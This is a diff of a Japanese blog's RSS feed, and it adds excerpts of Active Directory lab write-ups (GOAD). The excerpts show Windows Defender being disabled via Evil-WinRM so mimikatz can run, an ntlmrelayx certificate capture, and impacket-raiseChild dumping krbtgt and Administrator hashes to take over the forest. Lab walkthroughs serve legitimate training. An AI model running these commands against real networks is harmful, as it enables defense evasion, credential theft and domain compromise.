@@ -11,61 +11,12 @@
     </image>
     <generator>Hugo -- 0.136.5</generator>
     <language>ja-JP</language>
-    <lastBuildDate>Sat, 26 Oct 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sun, 27 Oct 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://famasoon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>GOAD Writeup Ch3</title>
-      <link>https://famasoon.github.io/posts/goad_writeupch3/</link>
-      <pubDate>Sat, 26 Oct 2024 00:00:00 +0000</pubDate>
-      <guid>https://famasoon.github.io/posts/goad_writeupch3/</guid>
-      <description>&lt;h2 id=&#34;round-3&#34;&gt;Round 3&lt;/h2&gt;
-&lt;p&gt;meereenの認証情報を&lt;code&gt;Administrator/P@ssw0rd!&lt;/code&gt; にした。&lt;/p&gt;
-&lt;p&gt;meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。&lt;/p&gt;
-&lt;h3 id=&#34;theft-1--exporting-certificates-using-the-cryptoapi&#34;&gt;THEFT 1  Exporting certificates using the CryptoAPI&lt;/h3&gt;
-&lt;p&gt;mimikatz.exeを用いて証明書を窃取する。&lt;/p&gt;
-&lt;p&gt;と思ったけどWindows Defenderでmimikatzが検知される。&lt;/p&gt;
-&lt;p&gt;khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\khal.drogo\Documents&amp;gt; whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                            Description                                                        State
-========================================= ================================================================== =======
-SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
-SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
-SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
-SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
-SeSystemProfilePrivilege                  Profile system performance                                         Enabled
-SeSystemtimePrivilege                     Change the system time                                             Enabled
-SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
-SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
-SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
-SeBackupPrivilege                         Back up files and directories                                      Enabled
-SeRestorePrivilege                        Restore files and directories                                      Enabled
-SeShutdownPrivilege                       Shut down the system                                               Enabled
-SeDebugPrivilege                          Debug programs                                                     Enabled
-SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
-SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
-SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
-SeUndockPrivilege                         Remove computer from docking station                               Enabled
-SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
-SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
-SeCreateGlobalPrivilege                   Create global objects                                              Enabled
-SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
-SeTimeZonePrivilege                       Change the time zone                                               Enabled
-SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
-SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
-*Evil-WinRM* PS C:\Users\khal.drogo\Documents&amp;gt; whoami 
-essos\khal.drogo
-
-*Evil-WinRM* PS C:\Users\khal.drogo\Documents&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これでmimikatz.exeを実行してみる&lt;/p&gt;</description>
-    </item>
     <item>
       <title>GOAD Writeup Ch3.5</title>
       <link>https://famasoon.github.io/posts/goad_writeupch3.5/</link>
-      <pubDate>Sat, 26 Oct 2024 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 27 Oct 2024 00:00:00 +0000</pubDate>
       <guid>https://famasoon.github.io/posts/goad_writeupch3.5/</guid>
       <description>&lt;h2 id=&#34;round-35&#34;&gt;Round 3.5&lt;/h2&gt;
 &lt;p&gt;ADCS攻略をやる&lt;/p&gt;
@@ -145,6 +96,85 @@ essos\khal.drogo
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sb&#34;&gt;[+] Got expected ERROR_BAD_NETPATH exception!!
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sb&#34;&gt;[+] Attack worked!
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ntlmrelayxに下記のような出力が出てpfxファイルを取得できる&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>GOAD Writeup Ch4</title>
+      <link>https://famasoon.github.io/posts/goad_writeupch4/</link>
+      <pubDate>Sun, 27 Oct 2024 00:00:00 +0000</pubDate>
+      <guid>https://famasoon.github.io/posts/goad_writeupch4/</guid>
+      <description>&lt;h2 id=&#34;round-4&#34;&gt;Round 4&lt;/h2&gt;
+&lt;p&gt;そろそろ狩るか…♤&lt;/p&gt;
+&lt;p&gt;最上位の親ドメインであるsevenkingdomsを攻略する&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;impacket-raiseChild&lt;/code&gt; で信頼関係のあるsevenkingdomsのNTLMハッシュをダンプする&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/goad/winterfell]
+└─$ impacket-raiseChild north.sevenkingdoms.local/Administrator -hashes :dbd13e1c4e338284ac4e9874f7de6ef4
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Raising child domain north.sevenkingdoms.local
+[*] Forest FQDN is: sevenkingdoms.local
+[*] Raising north.sevenkingdoms.local to sevenkingdoms.local
+[*] sevenkingdoms.local Enterprise Admin SID is: S-1-5-21-2095540843-66383145-2975355457-519
+[*] Getting credentials for north.sevenkingdoms.local
+north.sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9cd8721de5b33c59702a9f64787f1ea3:::
+north.sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:5ee25c7ef14d94c5a11bb2f794f18df7117a2f309ef29e5e9a5e17b79302e74d
+/usr/share/doc/python3-impacket/examples/raiseChild.py:910: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  tenYearsFromNow = datetime.datetime.utcnow() + datetime.timedelta(days=365*10)
+[*] Getting credentials for sevenkingdoms.local
+sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:20c52248354cb5f4cce513c736ce99a5:::
+sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:de6bb26a50c69a134f5a1863dd57d2cacc33e360eed075f948fb230701fb3cb8
+[*] Target User account name is Administrator
+sevenkingdoms.local/Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
+sevenkingdoms.local/Administrator:aes256-cts-hmac-sha1-96s:bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;味気がないので手元でゴールデンキーを作って試す。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>GOAD Writeup Ch3</title>
+      <link>https://famasoon.github.io/posts/goad_writeupch3/</link>
+      <pubDate>Sat, 26 Oct 2024 00:00:00 +0000</pubDate>
+      <guid>https://famasoon.github.io/posts/goad_writeupch3/</guid>
+      <description>&lt;h2 id=&#34;round-3&#34;&gt;Round 3&lt;/h2&gt;
+&lt;p&gt;meereenの認証情報を&lt;code&gt;Administrator/P@ssw0rd!&lt;/code&gt; にした。&lt;/p&gt;
+&lt;p&gt;meereenの配下のbraavosとかはADCSだ。せっかくだし、ADCS周りも攻撃しようじゃないか。&lt;/p&gt;
+&lt;h3 id=&#34;theft-1--exporting-certificates-using-the-cryptoapi&#34;&gt;THEFT 1  Exporting certificates using the CryptoAPI&lt;/h3&gt;
+&lt;p&gt;mimikatz.exeを用いて証明書を窃取する。&lt;/p&gt;
+&lt;p&gt;と思ったけどWindows Defenderでmimikatzが検知される。&lt;/p&gt;
+&lt;p&gt;khal.drogoはやりたい放題のアカウントなのでWindows Defenderのリアルタイムプロテクションを止める。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\khal.drogo\Documents&amp;gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents&amp;gt; whoami 
+essos\khal.drogo
+
+*Evil-WinRM* PS C:\Users\khal.drogo\Documents&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これでmimikatz.exeを実行してみる&lt;/p&gt;</description>
     </item>
     <item>
       <title>GOAD Writeup Ch2</title>
